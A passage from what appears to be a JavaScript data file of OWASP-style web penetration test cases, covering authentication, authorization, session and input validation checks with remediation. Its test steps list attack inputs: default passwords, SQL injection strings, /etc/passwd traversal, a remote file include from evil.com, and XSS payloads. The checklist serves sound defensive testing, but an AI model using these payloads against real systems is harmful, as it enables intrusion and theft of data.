  },

  // ============================================================
  // AUTHENTICATION TESTING (OTG-AUTHN)
  // ============================================================
  {
    id: "OTG-AUTHN-001",
    category: "Authentication",
    name: "Test for Credentials Transported over an Encrypted Channel",
    description: "Verify that user credentials are always transmitted over encrypted channels (HTTPS/TLS) to prevent interception via network sniffing or man-in-the-middle attacks.",
    objectives: [
      "Verify login form is served over HTTPS",
      "Ensure credentials are submitted over HTTPS",
      "Check that HTTP to HTTPS redirect occurs before credential submission",
      "Verify no credential leakage via referrer headers"
    ],
    howToTest: [
      "Check if login page URL uses HTTPS",
      "Verify form action URL uses HTTPS",
      "Test if login form is accessible over HTTP (should redirect to HTTPS)",
      "Check for mixed content warnings on login page",
      "Analyze network traffic for plaintext credential transmission",
      "Verify that API authentication endpoints require HTTPS",
      "Check for credentials in URL query strings (GET requests)",
      "Verify that session tokens are transmitted over HTTPS only"
    ],
    tools: ["Wireshark", "Burp Suite", "Browser DevTools", "curl"],
    remediation: "Serve all authentication pages exclusively over HTTPS. Implement HSTS. Use secure flag on cookies. Never transmit credentials in URL query strings. Redirect all HTTP traffic to HTTPS.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-001", "CWE-523: Unprotected Transport of Credentials"],
    severity: "High",
    owaspId: "OTG-AUTHN-001"
  },
  {
    id: "OTG-AUTHN-002",
    category: "Authentication",
    name: "Test for Default Credentials",
    description: "Check if the application or any of its components use default or well-known credentials that have not been changed from the factory settings.",
    objectives: [
      "Test for default admin credentials",
      "Check for default database credentials",
      "Identify well-known test accounts",
      "Test for vendor-specific default passwords"
    ],
    howToTest: [
      "Try common default combinations: admin/admin, admin/password, root/root, admin/123456, test/test",
      "Check vendor documentation for default credentials",
      "Search SecLists default-credentials for the technology stack",
      "Test for blank passwords on administrative accounts",
      "Check for hardcoded credentials in source code or configuration files",
      "Try technology-specific defaults: tomcat/tomcat, manager/manager, sa/sa (SQL Server)",
      "Check for application-specific defaults documented online",
      "Test for service accounts with vendor default passwords"
    ],
    tools: ["Hydra", "Medusa", "Nmap NSE scripts", "SecLists", "DefaultCreds-cheat-sheet"],
    remediation: "Change all default credentials before deployment. Implement forced password change on first login. Remove or disable default and test accounts in production. Use a credential management system.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-002", "CWE-798: Hard-coded Credentials"],
    severity: "Critical",
    owaspId: "OTG-AUTHN-002"
  },
  {
    id: "OTG-AUTHN-003",
    category: "Authentication",
    name: "Test for Weak Lock Out Mechanism",
    description: "Evaluate the account lockout mechanism to determine if it effectively prevents brute-force attacks while avoiding denial of service through account locking.",
    objectives: [
      "Determine if account lockout is implemented",
      "Identify lockout threshold and duration",
      "Test for lockout bypass techniques",
      "Check for user enumeration via lockout differences"
    ],
    howToTest: [
      "Attempt multiple failed logins and count the threshold before lockout",
      "Check if lockout applies to specific IP, account, or both",
      "Verify lockout duration (temporary vs permanent)",
      "Test if lockout can be bypassed by changing IP (proxy rotation)",
      "Check if lockout applies to API endpoints as well as web login",
      "Test if CAPTCHA appears after failed attempts before full lockout",
      "Verify that lockout notification is sent to the account owner",
      "Test if account can be unlocked via password reset",
      "Check if lockout counter resets after a successful login",
      "Test if lockout is based on username or IP address"
    ],
    tools: ["Burp Suite Intruder", "Hydra", "Custom scripts"],
    remediation: "Implement progressive delays after failed attempts (2s, 4s, 8s, 16s). Lock account after 5-10 failed attempts for 15-30 minutes. Require CAPTCHA after 3 failed attempts. Notify users of lockout events. Implement IP-based rate limiting in addition to account lockout.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-003", "CWE-307: Improper Restriction of Excessive Authentication Attempts"],
    severity: "Medium",
    owaspId: "OTG-AUTHN-003"
  },
  {
    id: "OTG-AUTHN-004",
    category: "Authentication",
    name: "Test for Bypassing Authentication Schema",
    description: "Attempt to bypass the authentication mechanism through direct page access, parameter manipulation, session prediction, or SQL injection in the authentication function.",
    objectives: [
      "Access protected pages without authentication",
      "Bypass authentication via parameter manipulation",
      "Exploit SQL injection in login functionality",
      "Predict or forge session tokens"
    ],
    howToTest: [
      "Directly request protected URLs without authenticating",
      "Remove or modify authentication cookies and retry protected requests",
      "Test for SQL injection in login: admin' OR '1'='1' --, ' OR 1=1 --",
      "Manipulate authentication parameters: change role=user to role=admin",
      "Test for authentication bypass via HTTP parameter pollution",
      "Check if authentication state is stored client-side and can be modified",
      "Test for JWT vulnerabilities: none algorithm, key confusion, expired token acceptance",
      "Try accessing admin API endpoints with regular user tokens",
      "Test for forced browsing to authenticated pages",
      "Check if removing the Referer header bypasses access controls",
      "Test for authentication bypass via X-Original-URL or X-Rewrite-URL headers"
    ],
    tools: ["Burp Suite", "OWASP ZAP", "sqlmap", "jwt_tool"],
    remediation: "Implement server-side authentication checks on every protected resource. Use prepared statements for all database queries in authentication. Validate JWT tokens properly including algorithm, expiration, and signature. Never rely on client-side authentication controls.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-004", "CWE-287: Improper Authentication"],
    severity: "Critical",
    owaspId: "OTG-AUTHN-004"
  },
  {
    id: "OTG-AUTHN-005",
    category: "Authentication",
    name: "Test for Vulnerable Remember Password Functionality",
    description: "Assess the 'remember me' or 'keep me signed in' functionality for security weaknesses that could allow session hijacking or unauthorized account access.",
    objectives: [
      "Determine how 'remember me' tokens are generated",
      "Check if tokens contain guessable or sensitive information",
      "Verify token expiration and invalidation",
      "Test for token theft and reuse"
    ],
    howToTest: [
      "Enable 'remember me' and analyze the token stored in cookies",
      "Check if the token contains encoded user information (Base64 decode it)",
      "Verify if remember-me token changes on each login",
      "Test if the token is invalidated when the password is changed",
      "Check token expiration duration (should not be indefinite)",
      "Test if remember-me tokens are bound to IP or device",
      "Verify tokens are transmitted with Secure and HttpOnly flags",
      "Check if logout properly invalidates remember-me tokens"
    ],
    tools: ["Burp Suite", "Browser DevTools", "CyberChef"],
    remediation: "Generate cryptographically random remember-me tokens. Store token hashes server-side (not the raw token). Invalidate tokens on password change. Set appropriate expiration. Use Secure and HttpOnly cookie flags.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-005"],
    severity: "Medium",
    owaspId: "OTG-AUTHN-005"
  },
  {
    id: "OTG-AUTHN-006",
    category: "Authentication",
    name: "Test for Browser Cache Weaknesses",
    description: "Check if sensitive authentication-related pages and data are cached by the browser, which could allow unauthorized access from shared computers.",
    objectives: [
      "Check for caching of login pages and credentials",
      "Verify autocomplete is properly configured",
      "Test for cached authenticated pages accessible via back button",
      "Ensure sensitive data is not stored in browser history"
    ],
    howToTest: [
      "Check Cache-Control headers on login and post-login pages: should include no-store, no-cache",
      "Verify Pragma: no-cache header is set for HTTP/1.0 compatibility",
      "Check if autocomplete is disabled on password fields: autocomplete='off' or autocomplete='new-password'",
      "Log in, close the tab, reopen browser - check if session persists without re-authentication",
      "Use the browser back button after logout to check for cached authenticated content",
      "Check Expires header (should be set to 0 or a past date for sensitive pages)",
      "Verify that sensitive form data is not stored in browser autofill"
    ],
    tools: ["Browser DevTools", "Burp Suite"],
    remediation: "Set Cache-Control: no-store, no-cache, must-revalidate on all authenticated pages. Add Pragma: no-cache for HTTP/1.0 compatibility. Set Expires: 0. Use autocomplete='off' on sensitive form fields. Implement proper logout that invalidates all sessions.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-006"],
    severity: "Low",
    owaspId: "OTG-AUTHN-006"
  },
  {
    id: "OTG-AUTHN-007",
    category: "Authentication",
    name: "Test for Weak Password Policy",
    description: "Evaluate the password policy for weaknesses that could make accounts vulnerable to brute-force, dictionary, or credential stuffing attacks.",
    objectives: [
      "Determine minimum password length requirement",
      "Check complexity requirements (uppercase, lowercase, numbers, special chars)",
      "Test for maximum password length",
      "Verify password history enforcement",
      "Check for common password blocking"
    ],
    howToTest: [
      "Attempt to set short passwords (1-7 characters)",
      "Try passwords without complexity: all lowercase, all numbers, no special chars",
      "Test common passwords: password, 123456, qwerty, letmein, admin",
      "Check maximum password length (should support at least 64 characters for passphrase support)",
      "Test if password can be the same as username",
      "Attempt to reuse previous passwords after a change",
      "Check if password strength meter provides accurate feedback",
      "Verify password change requires current password",
      "Test password expiration policy and forced change",
      "Check if bcrypt/scrypt/argon2 is used (password should be accepted up to 72+ chars)"
    ],
    tools: ["Manual testing", "Burp Suite"],
    remediation: "Enforce minimum 12-character passwords. Check against a breached password database (HIBP). Allow passphrases up to at least 128 characters. Do not enforce arbitrary complexity rules (NIST 800-63B). Use bcrypt, scrypt, or Argon2id for password hashing.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-007", "NIST SP 800-63B - Digital Identity Guidelines"],
    severity: "Medium",
    owaspId: "OTG-AUTHN-007"
  },
  {
    id: "OTG-AUTHN-008",
    category: "Authentication",
    name: "Test for Weak Security Question/Answer",
    description: "Evaluate security questions used for account recovery for weaknesses that could allow account takeover through easily guessable or publicly available information.",
    objectives: [
      "Assess strength of security questions",
      "Check if answers are easily guessable or publicly available",
      "Test for brute-force of security question answers",
      "Verify that security questions cannot be bypassed"
    ],
    howToTest: [
      "Review available security questions for weakness (mother's maiden name, pet's name, birth city)",
      "Check if users can create custom security questions",
      "Test if answers are case-sensitive",
      "Verify rate limiting on security question answer attempts",
      "Check if answers are hashed/encrypted in storage (not plaintext)",
      "Test if security questions can be bypassed via other recovery mechanisms",
      "Check if OSINT could easily provide answers (social media, public records)",
      "Test if multiple security questions are required or just one"
    ],
    tools: ["Manual testing", "Burp Suite"],
    remediation: "Avoid security questions entirely in favor of MFA, email-based recovery, or SMS codes. If security questions are required, use questions with answers not easily found via OSINT. Hash security question answers. Require multiple questions. Rate-limit answer attempts.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-008", "NIST SP 800-63B (recommends against security questions)"],
    severity: "Medium",
    owaspId: "OTG-AUTHN-008"
  },
  {
    id: "OTG-AUTHN-009",
    category: "Authentication",
    name: "Test for Weak Password Change or Reset Functionality",
    description: "Evaluate password change and reset mechanisms for vulnerabilities that could allow unauthorized password changes or account takeover.",
    objectives: [
      "Test password reset token security",
      "Verify password change requires current password",
      "Check for password reset poisoning",
      "Ensure reset tokens expire and are single-use"
    ],
    howToTest: [
      "Test if password change requires current password",
      "Check password reset link/token for predictability",
      "Verify reset tokens expire after a reasonable time (15-30 minutes)",
      "Test if reset tokens are single-use (cannot be reused after password change)",
      "Test for password reset poisoning: modify Host header during reset request to redirect the link to attacker's domain",
      "Check if reset link is sent over HTTPS",
      "Verify that password reset invalidates all existing sessions",
      "Test if password can be changed via CSRF (missing CSRF token)",
      "Check if the old password is invalidated immediately after change",
      "Test rate limiting on password reset requests"
    ],
    tools: ["Burp Suite", "curl", "Custom scripts"],
    remediation: "Generate cryptographically random reset tokens with sufficient entropy (at least 128 bits). Expire tokens after 15-30 minutes. Make tokens single-use. Validate Host header in reset emails. Require current password for password change. Invalidate all sessions after password change.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-009", "CWE-640: Weak Password Recovery Mechanism"],
    severity: "High",
    owaspId: "OTG-AUTHN-009"
  },
  {
    id: "OTG-AUTHN-010",
    category: "Authentication",
    name: "Test for Weaker Authentication in Alternative Channel",
    description: "Check if alternative authentication channels (mobile app, API, legacy interface) have weaker security controls than the primary web interface.",
    objectives: [
      "Identify all authentication channels (web, mobile, API, legacy)",
      "Compare security controls across channels",
      "Test for channel-specific vulnerabilities",
      "Verify consistent policy enforcement"
    ],
    howToTest: [
      "Identify all authentication endpoints (web login, mobile API, legacy SOAP, partner APIs)",
      "Compare authentication requirements across channels (MFA, CAPTCHA, lockout)",
      "Test if password policy is enforced consistently across all channels",
      "Check if session management is consistent across channels",
      "Test if account lockout on web also locks API access and vice versa",
      "Verify that alternative channels enforce HTTPS",
      "Check for legacy protocols with weaker authentication (Basic Auth, NTLM)"
    ],
    tools: ["Burp Suite", "Postman", "curl"],
    remediation: "Enforce consistent authentication policies across all channels. Apply the same password policy, lockout rules, and MFA requirements everywhere. Retire legacy authentication protocols. Use a centralized identity provider.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-010"],
    severity: "Medium",
    owaspId: "OTG-AUTHN-010"
  },
  {
    id: "OTG-AUTHN-011",
    category: "Authentication",
    name: "Test Multi-Factor Authentication",
    description: "Evaluate the implementation of multi-factor authentication for weaknesses that could allow bypass or downgrade of the additional authentication factor.",
    objectives: [
      "Verify MFA is enforced for sensitive operations",
      "Test for MFA bypass techniques",
      "Check MFA token/code security",
      "Assess MFA enrollment process security"
    ],
    howToTest: [
      "Test if MFA can be bypassed by directly accessing post-MFA endpoints",
      "Check if MFA step can be skipped by modifying response (changing a redirect or status)",
      "Test brute-force of MFA codes (typically 6-digit = 1,000,000 combinations)",
      "Verify rate limiting on MFA code submission",
      "Check if MFA codes expire (should be 30-60 seconds for TOTP)",
      "Test if previously used MFA codes are rejected (replay protection)",
      "Check if MFA can be disabled without re-authentication",
      "Test backup codes for proper single-use and secure storage",
      "Verify MFA enrollment requires identity verification",
      "Test if SMS-based MFA is vulnerable to SIM swapping (should prefer TOTP/FIDO2)"
    ],
    tools: ["Burp Suite", "Postman", "Custom scripts"],
    remediation: "Enforce MFA for all users, especially privileged accounts. Prefer TOTP or FIDO2 over SMS. Rate-limit MFA code attempts (max 3-5 attempts). Expire TOTP codes after one time window. Implement anti-brute-force measures. Require re-authentication to change MFA settings.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHN-011", "NIST SP 800-63B Section 5.1"],
    severity: "High",
    owaspId: "OTG-AUTHN-011"
  },

  // ============================================================
  // AUTHORIZATION TESTING (OTG-AUTHZ)
  // ============================================================
  {
    id: "OTG-AUTHZ-001",
    category: "Authorization",
    name: "Test for Directory Traversal and File Include",
    description: "Test if the application is vulnerable to path traversal attacks that could allow access to files and directories outside the intended web root.",
    objectives: [
      "Access files outside the web root",
      "Read sensitive system files (passwd, shadow, web.config)",
      "Test for local file inclusion (LFI)",
      "Test for remote file inclusion (RFI)"
    ],
    howToTest: [
      "Test basic traversal: ../../etc/passwd, ..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "Try URL encoding: %2e%2e%2f, %2e%2e/",
      "Double URL encoding: %252e%252e%252f",
      "Test null byte injection (older PHP): ../../etc/passwd%00",
      "Try Unicode/UTF-8 encoding: ..%c0%af, ..%c1%9c",
      "Test with absolute paths: /etc/passwd, C:\\Windows\\win.ini",
      "Check for LFI via include/require parameters: page=../../../../etc/passwd",
      "Test for RFI: page=http://evil.com/shell.txt (if allow_url_include is on)",
      "Try PHP wrappers: php://filter/convert.base64-encode/resource=config.php",
      "Test for path traversal in file upload filenames",
      "Check for traversal in cookies, headers, and other input vectors"
    ],
    tools: ["Burp Suite", "OWASP ZAP", "dotdotpwn", "LFISuite"],
    remediation: "Validate and sanitize all file path inputs. Use a whitelist of allowed files. Chroot or jail file access. Disable allow_url_include in PHP. Use realpath() to resolve and validate paths.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHZ-001", "CWE-22: Path Traversal"],
    severity: "Critical",
    owaspId: "OTG-AUTHZ-001"
  },
  {
    id: "OTG-AUTHZ-002",
    category: "Authorization",
    name: "Test for Bypassing Authorization Schema",
    description: "Verify that access controls are properly enforced and cannot be bypassed through direct URL access, parameter manipulation, or forced browsing.",
    objectives: [
      "Access unauthorized resources by manipulating identifiers",
      "Test for insecure direct object references (IDOR)",
      "Bypass authorization via HTTP parameter manipulation",
      "Test for forced browsing to privileged pages"
    ],
    howToTest: [
      "Access admin pages directly without admin role: /admin, /admin/users, /admin/settings",
      "Modify object IDs in URLs: /api/users/123 -> /api/users/124 (IDOR)",
      "Change role parameters in requests: isAdmin=false -> isAdmin=true",
      "Test HTTP method override: use POST instead of GET on restricted endpoints",
      "Add X-Original-URL or X-Rewrite-URL headers to bypass path-based access controls",
      "Test for parameter pollution to bypass authorization",
      "Modify JWT claims (role, permissions) and test acceptance",
      "Test API endpoint authorization separately from web UI authorization",
      "Check if GraphQL queries can access unauthorized data through relationship traversal",
      "Test for multi-tenancy authorization (accessing data from another tenant)"
    ],
    tools: ["Burp Suite", "Autorize (Burp extension)", "Postman", "OWASP ZAP"],
    remediation: "Implement server-side access control checks on every request. Use indirect object references (map GUIDs to internal IDs). Deny by default. Validate authorization at both the controller and data access layers. Use authorization frameworks consistently.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHZ-002", "CWE-639: Authorization Bypass Through User-Controlled Key"],
    severity: "Critical",
    owaspId: "OTG-AUTHZ-002"
  },
  {
    id: "OTG-AUTHZ-003",
    category: "Authorization",
    name: "Test for Privilege Escalation",
    description: "Test for the ability to escalate privileges from a lower-privilege account to a higher-privilege account (vertical) or access another user's resources (horizontal).",
    objectives: [
      "Perform vertical privilege escalation (user to admin)",
      "Perform horizontal privilege escalation (user A to user B)",
      "Test for privilege escalation via API manipulation",
      "Check for insecure role assignment"
    ],
    howToTest: [
      "Log in as regular user and attempt admin functions",
      "Modify user role in JWT, cookie, or request parameters",
      "Change user ID in API requests to access other users' data",
      "Test if regular user can create admin accounts",
      "Check if profile update allows role modification",
      "Test for mass assignment: send additional parameters in update requests (role, isAdmin, permissions)",
      "Attempt to access admin APIs with regular user session token",
      "Check if user can modify their own permissions or group membership",
      "Test for privilege escalation through parameter tampering in multi-step processes"
    ],
    tools: ["Burp Suite", "Autorize", "Postman"],
    remediation: "Enforce authorization checks server-side for every operation. Use allowlists for mass assignment. Never trust client-supplied role or permission data. Implement separation of privileges. Audit privilege changes.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHZ-003", "CWE-269: Improper Privilege Management"],
    severity: "Critical",
    owaspId: "OTG-AUTHZ-003"
  },
  {
    id: "OTG-AUTHZ-004",
    category: "Authorization",
    name: "Test for Insecure Direct Object References (IDOR)",
    description: "Test if the application exposes internal implementation objects through user-controllable references without proper access control validation.",
    objectives: [
      "Access objects belonging to other users",
      "Modify objects belonging to other users",
      "Enumerate objects through sequential IDs",
      "Access restricted resources via reference manipulation"
    ],
    howToTest: [
      "Identify endpoints with object references: /api/invoice/12345, /user/profile?id=42",
      "Change numeric IDs to access other users' objects: 12345 -> 12346",
      "Try predictable patterns: increment, decrement, sequence exploration",
      "Test with UUIDs: are they truly random or sequential?",
      "Check for IDOR in file access: /download?file=report_12345.pdf -> report_12346.pdf",
      "Test for IDOR in API endpoints: GET /api/orders/123, DELETE /api/orders/124",
      "Check for IDOR in multi-tenant applications: /tenant/abc/data -> /tenant/def/data",
      "Test GraphQL for IDOR via nested queries and mutations",
      "Check for IDOR in export/report generation endpoints",
      "Test for IDOR in password reset: change token target user"
    ],
    tools: ["Burp Suite", "Autorize", "Postman", "OWASP ZAP"],
    remediation: "Implement access control checks at the data layer. Use indirect object references (GUIDs mapped to internal IDs). Validate that the authenticated user has permission to access the requested object. Log and alert on repeated unauthorized access attempts.",
    references: ["OWASP Testing Guide v4.2 - OTG-AUTHZ-004", "CWE-639: Authorization Bypass Through User-Controlled Key"],
    severity: "High",
    owaspId: "OTG-AUTHZ-004"
  },

  // ============================================================
  // SESSION MANAGEMENT (OTG-SESS)
  // ============================================================
  {
    id: "OTG-SESS-001",
    category: "Session Management",
    name: "Test for Session Management Schema",
    description: "Evaluate the overall session management implementation, including session ID generation, transmission, storage, and lifecycle management.",
    objectives: [
      "Assess session ID randomness and entropy",
      "Verify secure cookie attributes",
      "Test session lifecycle management",
      "Check for session fixation vulnerabilities"
    ],
    howToTest: [
      "Collect multiple session IDs and analyze for patterns or predictability",
      "Calculate entropy of session IDs (should be >= 128 bits)",
      "Check cookie attributes: Secure, HttpOnly, SameSite, Domain, Path, Expires/Max-Age",
      "Verify session ID is not in URL (query string or path)",
      "Test if session ID changes after login (session fixation prevention)",
      "Check if session ID changes after privilege elevation",
      "Test concurrent session handling (is a previous session invalidated?)",
      "Verify session timeout is appropriate (15-30 minutes of inactivity)",
      "Test if session is invalidated server-side on logout",
      "Check if session ID is regenerated after authentication"
    ],
    tools: ["Burp Suite Sequencer", "Browser DevTools", "Custom scripts"],
    remediation: "Use cryptographically random session IDs with >= 128 bits of entropy. Set Secure, HttpOnly, and SameSite=Strict/Lax cookie flags. Regenerate session ID after authentication. Implement idle and absolute timeouts. Invalidate sessions server-side on logout.",
    references: ["OWASP Testing Guide v4.2 - OTG-SESS-001", "CWE-384: Session Fixation"],
    severity: "High",
    owaspId: "OTG-SESS-001"
  },
  {
    id: "OTG-SESS-002",
    category: "Session Management",
    name: "Test for Cookie Attributes",
    description: "Analyze cookie attributes to ensure session cookies are properly protected against common attacks such as XSS-based cookie theft, MITM interception, and CSRF.",
    objectives: [
      "Verify Secure flag (HTTPS only)",
      "Check HttpOnly flag (no JavaScript access)",
      "Assess SameSite attribute (CSRF protection)",
      "Review Domain and Path scope"
    ],
    howToTest: [
      "Inspect cookies in browser DevTools: Application > Cookies",
      "Check for Secure flag: cookie should only be sent over HTTPS",
      "Verify HttpOnly flag: cookie should not be accessible via document.cookie",
      "Check SameSite attribute: should be Strict or Lax for session cookies",
      "Review Domain attribute: should not be set to a broad domain (.example.com)",
      "Check Path attribute: should be as specific as possible",
      "Verify Expires/Max-Age: persistent cookies should expire appropriately",
      "Test if session cookies persist after browser restart (should not for session cookies)",
      "Check for unnecessary data in cookies (PII, role information)"
    ],
    tools: ["Browser DevTools", "Burp Suite", "curl"],
    remediation: "Set Secure flag on all cookies. Set HttpOnly on session cookies. Set SameSite=Lax or Strict. Scope Domain and Path as narrowly as possible. Do not store sensitive data in cookies. Use session cookies (no Expires) for authentication.",
    references: ["OWASP Testing Guide v4.2 - OTG-SESS-002", "RFC 6265 - HTTP State Management"],
    severity: "Medium",
    owaspId: "OTG-SESS-002"
  },
  {
    id: "OTG-SESS-003",
    category: "Session Management",
    name: "Test for Session Fixation",
    description: "Test if an attacker can fix a known session ID to a victim's browser and then use that session after the victim authenticates.",
    objectives: [
      "Determine if session ID is regenerated after login",
      "Test if externally set session IDs are accepted",
      "Check for session fixation via URL, cookie, or meta tag"
    ],
    howToTest: [
      "Note the session ID before authentication",
      "Authenticate and check if the session ID changed (it must change)",
      "Try setting a session cookie manually and then authenticating - check if the same cookie is used post-auth",
      "Test if session ID in URL parameter overrides cookie-based session",
      "Check if an attacker-chosen session ID persists after victim login",
      "Test if session fixation works via meta tag injection",
      "Verify session regeneration after privilege change (user to admin)"
    ],
    tools: ["Burp Suite", "Browser DevTools"],
    remediation: "Regenerate session ID on every authentication event. Reject session IDs that were not created by the server. Invalidate old session IDs immediately upon regeneration. Do not accept session IDs from URL parameters.",
    references: ["OWASP Testing Guide v4.2 - OTG-SESS-003", "CWE-384: Session Fixation"],
    severity: "High",
    owaspId: "OTG-SESS-003"
  },
  {
    id: "OTG-SESS-004",
    category: "Session Management",
    name: "Test for Exposed Session Variables",
    description: "Check if session variables, tokens, or sensitive data are exposed through URLs, error messages, logs, or other unintended channels.",
    objectives: [
      "Identify session tokens in URLs",
      "Check for session data in error messages",
      "Verify session data is not cached or logged",
      "Test for session token leakage via Referer header"
    ],
    howToTest: [
      "Check if session IDs appear in URLs (visible in browser history, server logs, Referer)",
      "Analyze Referer header when navigating to external sites for session leakage",
      "Check server logs for session token logging",
      "Test error pages for session or internal variable disclosure",
      "Verify session data is not stored in browser localStorage or sessionStorage insecurely",
      "Check if session tokens are included in HTTP GET requests",
      "Test for session token exposure in JavaScript variables accessible to other scripts"
    ],
    tools: ["Burp Suite", "Browser DevTools", "Wireshark"],
    remediation: "Never include session tokens in URLs. Use POST for sensitive operations. Set Referrer-Policy header to strict-origin-when-cross-origin or no-referrer. Avoid logging session tokens. Use HttpOnly cookies for session management.",
    references: ["OWASP Testing Guide v4.2 - OTG-SESS-004", "CWE-200: Information Exposure"],
    severity: "Medium",
    owaspId: "OTG-SESS-004"
  },
  {
    id: "OTG-SESS-005",
    category: "Session Management",
    name: "Test for Cross-Site Request Forgery (CSRF)",
    description: "Test if the application is vulnerable to Cross-Site Request Forgery attacks where an attacker can trick an authenticated user into performing unintended actions.",
    objectives: [
      "Identify state-changing actions vulnerable to CSRF",
      "Test for CSRF token implementation",
      "Check for CSRF bypass techniques",
      "Verify SameSite cookie attribute usage"
    ],
    howToTest: [
      "Identify state-changing requests (POST, PUT, DELETE, PATCH)",
      "Check if CSRF tokens are present in forms and AJAX requests",
      "Test if CSRF token is validated server-side (submit without token, with invalid token)",
      "Check if CSRF token is tied to the user session (swap tokens between users)",
      "Test token predictability (are tokens static or per-request?)",
      "Try CSRF via different content types: application/x-www-form-urlencoded, multipart/form-data, text/plain",
      "Test if removing the Referer/Origin header bypasses CSRF protection",
      "Check for JSON-based CSRF (can JSON endpoints be triggered by forms?)",
      "Create proof-of-concept CSRF HTML page to test exploitation",
      "Verify SameSite cookie attribute provides additional protection"
    ],
    tools: ["Burp Suite (Generate CSRF PoC)", "OWASP ZAP", "Custom HTML pages"],
    remediation: "Implement anti-CSRF tokens (synchronizer token pattern) for all state-changing requests. Validate Origin and Referer headers as a defense-in-depth measure. Use SameSite=Strict or Lax cookie attribute. For APIs, require custom headers (X-Requested-With) that cannot be set cross-origin.",
    references: ["OWASP Testing Guide v4.2 - OTG-SESS-005", "CWE-352: Cross-Site Request Forgery"],
    severity: "High",
    owaspId: "OTG-SESS-005"
  },
  {
    id: "OTG-SESS-006",
    category: "Session Management",
    name: "Test for Logout Functionality",
    description: "Verify that the logout function properly terminates the user session and that session tokens cannot be reused after logout.",
    objectives: [
      "Verify session is invalidated server-side on logout",
      "Check that session cookies are cleared",
      "Test if back button can access cached authenticated pages",
      "Verify all related tokens are invalidated"
    ],
    howToTest: [
      "Log out and attempt to use the old session token (should fail)",
      "Check if session cookie is deleted/expired on logout",
      "Use the browser back button after logout (should not show authenticated content)",
      "Test if remember-me tokens are invalidated on logout",
      "Check if all active sessions are terminated (not just the current one)",
      "Verify that cached pages require re-authentication after logout",
      "Test if the logout endpoint is protected against CSRF",
      "Check if WebSocket connections are closed on logout"
    ],
    tools: ["Burp Suite", "Browser DevTools"],
    remediation: "Invalidate the session server-side on logout. Clear session cookies. Set Cache-Control: no-store on authenticated pages. Provide a 'logout all sessions' option. Invalidate remember-me tokens on explicit logout.",
    references: ["OWASP Testing Guide v4.2 - OTG-SESS-006", "CWE-613: Insufficient Session Expiration"],
    severity: "Medium",
    owaspId: "OTG-SESS-006"
  },
  {
    id: "OTG-SESS-007",
    category: "Session Management",
    name: "Test Session Timeout",
    description: "Verify that sessions are properly expired after a reasonable period of inactivity and that absolute session lifetime limits are enforced.",
    objectives: [
      "Determine idle session timeout duration",
      "Check for absolute session lifetime limits",
      "Verify timeout is enforced server-side",
      "Test timeout consistency across endpoints"
    ],
    howToTest: [
      "Log in and wait without activity - determine when session expires",
      "Check if idle timeout is appropriate for the application's risk level (financial: 5-15min, general: 30min)",
      "Test if absolute session lifetime is enforced (session should expire regardless of activity after a maximum time)",
      "Verify timeout is enforced server-side (not just client-side redirect)",
      "Check if timeout applies to API sessions as well as web sessions",
      "Test if session renewal extends the timeout properly",
      "Verify that timeout cannot be extended by client-side manipulation"
    ],
    tools: ["Burp Suite", "Custom scripts", "curl"],
    remediation: "Implement idle timeout (15-30 minutes for standard applications, 5-15 for high-risk). Set absolute session lifetime (8-24 hours). Enforce timeout server-side. Extend timeout only on explicit user activity, not keep-alive requests.",
    references: ["OWASP Testing Guide v4.2 - OTG-SESS-007", "CWE-613: Insufficient Session Expiration"],
    severity: "Medium",
    owaspId: "OTG-SESS-007"
  },

  // ============================================================
  // INPUT VALIDATION (OTG-INPVAL)
  // ============================================================
  {
    id: "OTG-INPVAL-001",
    category: "Input Validation",
    name: "Test for Reflected Cross-Site Scripting (XSS)",
    description: "Test if the application reflects user input in responses without proper encoding, allowing an attacker to execute malicious JavaScript in victims' browsers.",
    objectives: [
      "Identify input reflection points",
      "Test for unencoded reflection in HTML context",
      "Test for XSS in different contexts (attributes, JavaScript, URLs)",
      "Assess WAF and filter bypass potential"
    ],
    howToTest: [
      "Inject a benign probe in all parameters: <test>alert</test>, canary12345",
      "If reflected, test for XSS: <script>alert(1)</script>",
      "Test in attribute context: ' onmouseover='alert(1)' , \" onfocus=\"alert(1)\" autofocus",
      "Test in JavaScript context: ';alert(1)//, \\';alert(1)//",
      "Test in URL context: javascript:alert(1), data:text/html,<script>alert(1)</script>",
      "Try encoding bypass: <scr<script>ipt>alert(1)</script>, <SCRIPT>alert(1)</SCRIPT>",
      "Test event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>",
      "Try polyglot payload: jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
      "Test in HTTP headers if reflected: User-Agent, Referer, X-Forwarded-For",
      "Check for DOM-based XSS sinks: document.write, innerHTML, eval, setTimeout"
    ],
    tools: ["Burp Suite", "OWASP ZAP", "XSStrike", "Dalfox", "Browser DevTools"],
    remediation: "Context-aware output encoding: HTML entity encoding for HTML context, JavaScript encoding for JS context, URL encoding for URL context. Implement Content Security Policy (CSP). Use HttpOnly cookies to prevent session theft. Validate and sanitize input on the server side.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-001", "CWE-79: Cross-site Scripting"],
    severity: "High",
    owaspId: "OTG-INPVAL-001"
  },
  {
    id: "OTG-INPVAL-002",
    category: "Input Validation",
    name: "Test for Stored Cross-Site Scripting (XSS)",
    description: "Test if user-supplied data is stored by the application and later displayed to other users without proper encoding, enabling persistent XSS attacks.",
    objectives: [
      "Identify stored input that is displayed to other users",
      "Test for persistent XSS in profile fields, comments, messages",
      "Check for XSS in file upload metadata",
      "Test for stored XSS via API inputs"
    ],
    howToTest: [
      "Submit XSS payloads in profile fields: display name, bio, address, website",
      "Test in user-generated content: comments, forum posts, reviews, messages",
